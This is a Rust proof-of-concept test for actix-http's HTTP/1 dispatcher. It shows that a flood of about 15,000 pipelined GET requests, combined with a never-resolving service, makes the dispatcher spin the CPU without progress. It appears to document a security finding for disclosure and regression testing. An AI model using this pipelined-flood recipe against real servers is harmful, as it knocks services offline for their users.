
// ===== rust-in-peace 3-pass finding #1: pipelined-flood busy-loop CPU DoS (dispatcher.rs:1135) =====
// Appended to actix-http/src/h1/dispatcher_tests.rs. Drives the REAL h1::Dispatcher with a
// TestBuffer preloaded with a pipelined flood and an always-Pending service. Detects the busy loop
// via a counting Waker: in the stuck state the dispatcher self-wakes on every poll (demanding an
// immediate re-poll) while consuming no new input and producing no output. A correct dispatcher
// would park without self-waking.
#[actix_rt::test]
async fn busy_loop_pipelined_flood_poc() {
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::task::{Context, RawWaker, RawWakerVTable, Waker};

    // ~420KB of tiny bodyless pipelined GETs: fills the 16-slot `messages` queue AND keeps the
    // dispatcher's internal read_buf pinned at >= MAX_BUFFER_SIZE (131072).
    let one = b"GET /x HTTP/1.1\r\nHost: x\r\n\r\n";
    let mut data = Vec::with_capacity(one.len() * 15000);
    for _ in 0..15000 {
        data.extend_from_slice(one);
    }
    let buf = TestBuffer::new(&data[..]);

    // Service whose future is ALWAYS Pending: the single in-flight call never resolves, so the
    // pipeline queue fills to MAX_PIPELINED_MESSAGES (16) and never drains.
    fn pending_service() -> impl Service<Request, Response = Response<&'static str>, Error = Error> {
        fn_service(|_req: Request| {
            futures_util::future::pending::<Result<Response<&'static str>, Error>>()
        })
    }

    let services = HttpFlow::new(pending_service(), ExpectHandler, None);
    let h1 = Dispatcher::<_, _, _, _, UpgradeHandler>::new(
        buf.clone(),
        services,
        ServiceConfig::default(),
        None,
        OnConnectData::default(),
    );
    pin!(h1);

    // Counting waker.
    static WAKES: AtomicUsize = AtomicUsize::new(0);
    fn vt_clone(_: *const ()) -> RawWaker {
        RawWaker::new(std::ptr::null(), &VT)
    }
    fn vt_wake(_: *const ()) {
        WAKES.fetch_add(1, Ordering::SeqCst);
    }
    fn vt_wake_ref(_: *const ()) {
        WAKES.fetch_add(1, Ordering::SeqCst);
    }
    fn vt_drop(_: *const ()) {}
    static VT: RawWakerVTable = RawWakerVTable::new(vt_clone, vt_wake, vt_wake_ref, vt_drop);
    let waker = unsafe { Waker::from_raw(RawWaker::new(std::ptr::null(), &VT)) };
    let mut cx = Context::from_waker(&waker);

    // Warm-up: buffer the flood, fill the queue, start the (forever-pending) service.
    for _ in 0..10 {
        let _ = h1.as_mut().poll(&mut cx);
    }
    let src_warm = buf.read_buf.borrow().len();
    let writes_warm = buf.write_buf.borrow().len();
    WAKES.store(0, Ordering::SeqCst);

    // Poll many times with NO new input. Healthy dispatcher: parks, self_wakes stays ~0.
    // Busy-loop: self-wakes on (nearly) every poll, zero progress.
    const N: usize = 200;
    for _ in 0..N {
        assert!(h1.as_mut().poll(&mut cx).is_pending());
    }
    let wakes = WAKES.load(Ordering::SeqCst);
    let src_after = buf.read_buf.borrow().len();
    let writes_after = buf.write_buf.borrow().len();

    println!("[PoC] warm-up: src_remaining={src_warm}B writes={writes_warm}B");
    println!(
        "[PoC] {N} polls, NO new input: self_wakes={wakes}, src_remaining={src_after}B (consumed Δ={}), writes={writes_after}B (Δ={})",
        src_warm as isize - src_after as isize,
        writes_after as isize - writes_warm as isize
    );

    assert!(
        wakes >= N / 2,
        "expected self-wake spin (>= {} over {N} polls), got {wakes} -> NOT a busy loop",
        N / 2
    );
    assert_eq!(src_after, src_warm, "dispatcher kept reading -> not the stuck state");
    assert_eq!(writes_after, writes_warm, "dispatcher produced output -> not a busy loop");
    println!("[PoC] BUSY-LOOP CONFIRMED: {wakes} self-wakes / {N} polls, 0 input consumed, 0 output");
}
